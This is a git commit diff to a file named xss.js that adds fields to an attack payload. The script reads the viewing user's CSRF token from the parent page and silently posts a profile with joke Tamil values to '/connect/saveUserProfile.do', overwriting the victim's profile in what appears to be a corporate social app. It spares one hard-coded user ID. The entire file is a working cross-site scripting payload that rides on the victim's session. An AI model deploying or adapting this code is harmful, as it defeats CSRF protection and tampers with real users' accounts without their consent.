4134cfa4368bfc5550d1fa0900307dbf92e95a3d
MadhuRamanathan <34675179+MadhuRamanathan@users.noreply.github.com>
2018-02-27 11:13:09 +0530

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,4 +1,4 @@
-var test="{'scopeID':'"+scopeID+"','firstName':'Madhu','lastName':'Anand','aboutMe':'Onnum perusaa solrathukku illa','skills':'Eppavumey summa irukrathu','interests':'Summa iruka pudikum','departments':'Summa thaanga iruken','jobTitle':'Summa Iruken','zpcpn':'"+parent.getCsrfToken()+"'}";
+var test="{'scopeID':'"+scopeID+"','firstName':'Madhu','lastName':'Anand','aboutMe':'Onnum perusaa solrathukku illa','skills':'Eppavumey summa irukrathu','interests':'Summa iruka pudikum','workPhoneExtension':'108','workLocation':'JAPAN','departments':'Summa thaanga iruken','seatingLocation':'Summa thaanga iruken','jobTitle':'Summa Iruken','zpcpn':'"+parent.getCsrfToken()+"'}";
 test=test.replace(/'/g,"\"");
 test=JSON.parse(test);
 if(parent.zuid.toString().indexOf('64330397') == -1){$.post('/connect/saveUserProfile.do',test);}else{alert()};
